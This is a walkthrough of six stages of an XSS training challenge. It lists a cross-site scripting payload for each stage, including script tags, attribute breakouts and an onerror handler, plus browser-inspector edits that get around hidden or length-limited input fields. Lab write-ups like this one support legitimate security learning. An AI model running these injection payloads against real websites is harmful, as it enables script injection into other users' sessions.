## Stage #1
**Payload:** `<script>alert(document.domain)</script>`


## Stage #2
**Payload:** `"><script>alert(document.domain)</script>//`


## Stage #3
Go to inspect and change a option (e.g. USA) to `<script>alert(document.domain)</script>`
Then choose this and click search


## Stage #4
Go to inspect. You'll see a hidden input field after the select tag. Make it visible by removing `type`.
Then use this payload in that input field:
```
"><script>alert(document.domain)</script>//
```

## Stage #5
Go to inspect. You will see a input field like this:
```html
<input type="text" name="p1" maxlength="15" size="30" value="">
```
So just delete the maxlength="15" and size="30".
Then use this payload in that input field:
```
"><script>alert(document.domain)</script>//
```

## Stage #6
Use this payload: `" onerror=alert(document.domain)`
Click the search button. Then click the input field again. SOLVED!

